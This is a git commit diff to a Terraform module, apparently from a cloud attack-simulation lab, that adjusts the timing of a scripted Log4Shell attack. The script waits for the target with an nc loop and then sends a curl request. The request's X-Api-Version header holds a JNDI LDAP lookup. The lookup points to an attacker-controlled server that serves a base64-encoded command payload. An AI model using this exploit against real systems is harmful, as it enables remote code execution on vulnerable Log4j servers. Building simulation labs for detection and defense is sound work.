cd4288c1ed7c3ff58d3382b159932c0fd071b2df
credibleforce <jamiefrasermcmurray@gmail.com>
2022-11-26 15:38:11 -0800

    adjust log4shell attack timing

--- csp/aws/modules/attacker-exec-docker-log4shell-attacker/main.tf
+++ csp/aws/modules/attacker-exec-docker-log4shell-attacker/main.tf
@@ -31,9 +31,16 @@ locals {
     log "$(echo 'docker run -d --name ${local.name} --rm -p ${local.attacker_http_port}:8088 -p ${local.attacker_ldap_port}:1389 ${local.image} ${local.command_payload}')"
     docker run -d --name ${local.name} --rm -p ${local.attacker_http_port}:8088 -p ${local.attacker_ldap_port}:1389 ${local.image} ${local.command_payload} >> $LOGFILE 2>&1
     docker ps -a >> $LOGFILE 2>&1
-    log "curl --verbose ${local.target_ip}:${local.target_port} -H 'X-Api-Version: $${jndi:ldap://${local.attacker_ip}:${local.attacker_ldap_port}/Basic/Command/Base64/${local.base64_log4shell_payload}}'"
-    curl --verbose ${local.target_ip}:${local.target_port} -H 'X-Api-Version: $${jndi:ldap://${local.attacker_ip}:${local.attacker_ldap_port}/Basic/Command/Base64/${local.base64_log4shell_payload}}' >> $LOGFILE 2>&1 
-    sleep 30
+    log "payload: curl --verbose ${local.target_ip}:${local.target_port} -H 'X-Api-Version: $${jndi:ldap://${local.attacker_ip}:${local.attacker_ldap_port}/Basic/Command/Base64/${local.base64_log4shell_payload}}'"
+    log "checking target: ${local.target_ip}:${local.target_port}"
+    while ! nc -w 5 -v ${local.target_ip}:${local.target_port}; do
+        log "failed check - waiting for target";
+        sleep 30
+    done;
+    sleep 60
+    log "target available - sending payload"
+    curl --verbose ${local.target_ip}:${local.target_port} -H 'X-Api-Version: $${jndi:ldap://${local.attacker_ip}:${local.attacker_ldap_port}/Basic/Command/Base64/${local.base64_log4shell_payload}}' >> $LOGFILE 2>&1
+    log "payload sent sleeping..."
     log "done"
     EOT
     base64_payload = base64encode(local.payload)
